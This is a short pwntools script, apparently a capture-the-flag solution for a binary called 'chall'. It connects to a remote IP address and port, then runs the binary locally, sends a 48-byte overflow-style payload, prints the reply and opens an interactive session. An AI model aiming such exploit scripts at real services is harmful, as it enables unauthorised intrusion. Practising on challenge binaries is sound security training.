from pwn import *
r = remote('34.143.130.87',4097)
elf=ELF('./chall')
r=elf.process()
r.sendline(b'a'*48)
str=r.recvuntil(b'\n')
print(str)
r.sendline(b'a')
r.interactive()
